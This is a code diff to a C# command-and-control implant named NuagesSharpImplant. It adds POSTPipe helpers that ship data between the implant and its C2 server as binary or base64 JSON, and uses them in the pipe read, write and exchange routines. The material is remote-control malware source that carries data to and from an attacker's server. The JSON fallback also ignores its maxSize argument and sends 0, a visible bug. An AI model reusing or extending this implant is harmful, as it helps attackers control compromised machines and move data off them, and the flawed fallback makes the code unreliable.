@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Json;
+using System.Security.Policy;
 
 namespace NuagesSharpImplant
 {
@@ -9,9 +10,13 @@ namespace NuagesSharpImplant
     {
         private NuagesC2Connection NC2Con;
 
+        private bool supportsBinaryIO;
+
         public NuagesC2Connector(NuagesC2Connection NC2Con)
         {
             this.NC2Con = NC2Con;
+
+            this.supportsBinaryIO = NC2Con.supportsBinaryIO();
         }
 
         public string getConnectionString()
@@ -49,6 +54,43 @@ namespace NuagesSharpImplant
         string POST(string url, string jsonContent)
         {
             return this.NC2Con.POST(url, jsonContent);
+        }
+
+        byte[] POSTPipe(string pipe_id, byte[] input, long maxSize)
+        {
+            if (this.supportsBinaryIO)
+            {
+                string url = "io/" + pipe_id + "/" + maxSize;
+                return this.NC2Con.POST(url, input);
+            }
+            else
+            {
+                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
+                list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
+                JsonObject body = new JsonObject(list);
+                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+                return Convert.FromBase64String(response["out"]);
+            }
+
+        }
+        byte[] POSTPipe(string pipe_id, byte[] input)
+        {
+            if (this.supportsBinaryIO)
+            {
+                string url = "io/" + pipe_id;
+                return this.NC2Con.POST(url, input);
+            }
+            else {
+                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
+                JsonObject body = new JsonObject(list);
+                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
+                return Convert.FromBase64String(response["out"]);
+            }
+
         }
 
         public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
@@ -113,12 +155,7 @@ namespace NuagesSharpImplant
             {
                 while (memory.Length < BytesWanted)
                 {
-                    List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
-                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - memory.Length)));
-                    JsonObject body = new JsonObject(list);
-                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
-                    buffer = Convert.FromBase64String(response["out"]);
+                    buffer = POSTPipe(pipe_id, new byte[0], Math.Min(this.getBufferSize(), BytesWanted - memory.Length));
                     memory.Write(buffer, 0, buffer.Length);
                     System.Threading.Thread.Sleep(this.getRefreshRate());
                 }
@@ -132,12 +169,7 @@ namespace NuagesSharpImplant
             byte[] buffer;
             while (ReadBytes < BytesWanted)
             {
-                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
-                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                list.Add(new KeyValuePair<string, JsonValue>("maxSize", Math.Min(this.getBufferSize(), BytesWanted - ReadBytes)));
-                JsonObject body = new JsonObject(list);
-                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
-                buffer = Convert.FromBase64String(response["out"]);
+                buffer = POSTPipe(pipe_id, new byte[0], Math.Min(this.getBufferSize(), BytesWanted - ReadBytes));
                 ReadBytes += buffer.Length;
                 stream.Write(buffer, 0, buffer.Length);
                 System.Threading.Thread.Sleep(this.getRefreshRate());
@@ -156,33 +188,19 @@ namespace NuagesSharpImplant
                 {
                     byte[] buffer2 = new byte[ReadBytes];
                     Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
-                    list = new List<KeyValuePair<string, JsonValue>>();
-                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
-                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
-                    body = new JsonObject(list);
+                    POSTPipe(pipe_id, buffer2, 0);
                 }
                 else
                 {
-                    list = new List<KeyValuePair<string, JsonValue>>();
-                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
-                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
-                    body = new JsonObject(list);
+                    POSTPipe(pipe_id, buffer, 0);
+                    System.Threading.Thread.Sleep(this.getRefreshRate());
                 }
-                this.POST("io", body.ToString());
-                System.Threading.Thread.Sleep(this.getRefreshRate());
             }
         }
 
         public byte[] PipeRead(string pipe_id)
         {
-            List<KeyValuePair<string, JsonValue>>  list = new List<KeyValuePair<string, JsonValue>>();
-            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-            list.Add(new KeyValuePair<string, JsonValue>("maxSize", this.getBufferSize()));
-            JsonObject body = new JsonObject(list);
-            JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
-            return Convert.FromBase64String(response["out"]);
+            return POSTPipe(pipe_id, new byte[0], this.getBufferSize());
         }
 
         public void PipeWrite(string pipe_id, byte[] data)
@@ -198,26 +216,16 @@ namespace NuagesSharpImplant
                 if ((data.Length - sentData) < bufferSize) {
                     byte[] buffer2 = new byte[data.Length - sentData];
                     Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
-                    list = new List<KeyValuePair<string, JsonValue>>();
-                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
-                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
-                    body = new JsonObject(list);
-
+                    POSTPipe(pipe_id, buffer2, 0);
                     sentData = data.Length;
                 }
                 else
                 {
                     Array.Copy(data, sentData, buffer, 0, bufferSize);
-                    list = new List<KeyValuePair<string, JsonValue>>();
-                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                    list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
-                    list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
-                    body = new JsonObject(list);
+                    POSTPipe(pipe_id, buffer, 0);
                     sentData += bufferSize;
+                    System.Threading.Thread.Sleep(refreshrate);
                 }
-                this.POST("io", body.ToString());
-                System.Threading.Thread.Sleep(refreshrate);
             }
             return;
         }
@@ -228,6 +236,7 @@ namespace NuagesSharpImplant
             int refreshrate = this.getRefreshRate();
             int bufferSize = this.getBufferSize();
             byte[] buffer = new byte[bufferSize];
+            byte[] buffer3;
             JsonObject body;
             List<KeyValuePair<string, JsonValue>> list;
             using (MemoryStream memory = new MemoryStream()) { 
@@ -237,28 +246,17 @@ namespace NuagesSharpImplant
                     {
                         byte[] buffer2 = new byte[data.Length - sentData];
                         Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
-                        list = new List<KeyValuePair<string, JsonValue>>();
-                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
-                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer2)));
-                        body = new JsonObject(list);
-
+                        buffer3 = POSTPipe(pipe_id, buffer2, bufferSize);
                         sentData = data.Length;
                     }
                     else
                     {
                         Array.Copy(data, sentData, buffer, 0, bufferSize);
-                        list = new List<KeyValuePair<string, JsonValue>>();
-                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
-                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", bufferSize));
-                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(buffer)));
-                        body = new JsonObject(list);
+                        buffer3 = POSTPipe(pipe_id, buffer, bufferSize);
+                        sentData += bufferSize;
+                        System.Threading.Thread.Sleep(refreshrate);
                     }
-                    JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
-                    buffer = Convert.FromBase64String(response["out"]);
-                    memory.Write(buffer, 0, buffer.Length);
-                    System.Threading.Thread.Sleep(this.getRefreshRate());
-                    System.Threading.Thread.Sleep(refreshrate);
+                    memory.Write(buffer3, 0, buffer3.Length);
                 }
                 return memory.ToArray();
             }
